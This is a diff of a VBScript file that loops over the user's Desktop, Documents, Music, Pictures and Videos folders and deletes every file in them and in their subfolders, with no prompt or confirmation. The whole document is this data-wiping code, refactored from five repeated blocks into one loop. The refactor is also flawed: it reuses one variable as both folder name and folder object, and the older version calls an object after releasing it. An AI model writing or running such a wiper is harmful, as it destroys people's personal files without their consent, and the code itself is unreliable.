@@ -1,108 +1,33 @@
 Option Explicit
 
-Dim objFSO, objFolder, objFile, objSubFolder, objShell
+Dim objFSO, objFolder, objSubFolder, objFile, objShell
 
 ' Create a FileSystemObject
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' Get the Desktop folder
-Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))
+' Loop through each special folder and delete files
+For Each objFolder In Array("Desktop", "Documents", "Music", "Pictures", "Videos")
+' Get the current special folder
+Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders(objFolder))
+' Loop through each subfolder in the current special folder and delete files
+For Each objSubFolder in objFolder.SubFolders
+    ' Loop through each file in the current subfolder and delete it
+    For Each objFile In objSubFolder.Files
+        objFSO.DeleteFile(objFile)
+    Next
+Next
 
-' Loop through each file in the Desktop folder and delete it
+' Loop through each file in the current special folder and delete it
 For Each objFile In objFolder.Files
     objFSO.DeleteFile(objFile)
+Next
 Next
 
 ' Release FileSystemObject resources
 Set objFile = Nothing
+Set objSubFolder = Nothing
 Set objFolder = Nothing
 Set objFSO = Nothing
 
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
-
-' Get the documents folder
-Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyDocuments"))
-
-' Loop through each file in the documents folder and delete it
-For Each objFile In objFolder.Files
-    objFSO.DeleteFile(objFile)
-Next
-
-' Loop through each subfolder in the documents folder
-For Each objSubFolder In objFolder.SubFolders
-    ' Loop through each file in the subfolder and delete it
-    For Each objFile In objSubFolder.Files
-        objFSO.DeleteFile(objFile)
-    Next
-Next
-
-' Release FileSystemObject resources
-Set objFile = Nothing
-Set objSubFolder = Nothing
-Set objFolder = Nothing
-
-' Get the music folder
-Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyMusic"))
-
-' Loop through each file in the music folder and delete it
-For Each objFile In objFolder.Files
-    objFSO.DeleteFile(objFile)
-Next
-
-' Loop through each subfolder in the music folder
-For Each objSubFolder In objFolder.SubFolders
-    ' Loop through each file in the subfolder and delete it
-    For Each objFile In objSubFolder.Files
-        objFSO.DeleteFile(objFile)
-    Next
-Next
-
-' Release FileSystemObject resources
-Set objFile = Nothing
-Set objSubFolder = Nothing
-Set objFolder = Nothing
-
-' Get the pictures folder
-Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyPictures"))
-
-' Loop through each file in the pictures folder and delete it
-For Each objFile In objFolder.Files
-    objFSO.DeleteFile(objFile)
-Next
-
-' Loop through each subfolder in the pictures folder
-For Each objSubFolder In objFolder.SubFolders
-    ' Loop through each file in the subfolder and delete it
-    For Each objFile In objSubFolder.Files
-        objFSO.DeleteFile(objFile)
-    Next
-Next
-
-' Release FileSystemObject resources
-Set objFile = Nothing
-Set objSubFolder = Nothing
-Set objFolder = Nothing
-
-' Get the videos folder
-Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyVideos"))
-
-' Loop through each file in the videos folder and delete it
-For Each objFile In objFolder.Files
-    objFSO.DeleteFile(objFile)
-Next
-
-' Loop through each subfolder in the videos folder
-For Each objSubFolder In objFolder.SubFolders
-    ' Loop through each file in the subfolder and delete it
-    For Each objFile In objSubFolder.Files
-objFSO.DeleteFile(objFile)
-Next
-Next
-
-' Release FileSystemObject resources
-Set objFile = Nothing
-Set objSubFolder = Nothing
-Set objFolder = Nothing
-
-' Continue with the rest of the code...
